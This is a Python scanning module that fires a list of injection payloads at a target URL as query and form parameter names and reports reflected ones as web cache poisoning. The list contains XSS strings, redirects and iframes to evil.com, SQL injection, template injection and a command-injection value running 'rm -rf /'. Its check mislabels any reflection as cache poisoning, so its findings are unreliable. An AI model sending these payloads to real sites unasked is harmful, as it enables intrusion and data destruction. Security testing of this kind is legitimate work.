import requests
from bs4 import BeautifulSoup
import threading
from list import *


param_names = [
    "test;alert('poisoned')",
    "test;document.cookie",
    "test;window.location='http://evil.com'",
    "test;<script>alert('xss')</script>",
    "test;'><img src=x onerror=alert(1)>",
    "test;'><iframe src=http://evil.com></iframe>",
    "test;1 OR 1=1",
    "test;`rm -rf /`",
    "test;${7*7}",
    "test;{\"username\":\"admin\", \"password\":\"pass\"}",
]

def check_params(url, params, method='GET'):
    if method.upper() == 'GET':
        response = requests.get(url, params=params)
    elif method.upper() == 'POST':
        response = requests.post(url, data=params)
    else:
        return None

    if response.status_code == 200:
        return response.text
    return None

def analyze_response(response):
    if response:
        for param in param_names:
            if param in response:
                return True
            if param in response.lower():
                return True

        

    return False

def process_param(param, base_url):
    params = {param: 'vulnb'}

    # Check GET request
    response_get = check_params(base_url, params, method='GET')
    if analyze_response(response_get):
        
            print(f"Web Cache Poisoning via semicolon query separator '{param}' via GET")
            my_list.append(f"Web Cache Poisoning via semicolon query separator '{param}' via GET")
    else:
            print(f"Interesting response with parameter '{param}' via GET")

    response_post = check_params(base_url, params, method='POST')
    if analyze_response(response_post):
            print(f"Web Cache Poisoning via semicolon query separator '{param}' via POST")
            my_list.append(f"Web Cache Poisoning via semicolon query separator '{param}' via POST")
    else:
            print(f"Interesting response with parameter '{param}' via POST")


def main_param(url):
    threads = []
    for param in param_names:
        thread = threading.Thread(target=process_param, args=(param, url))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()
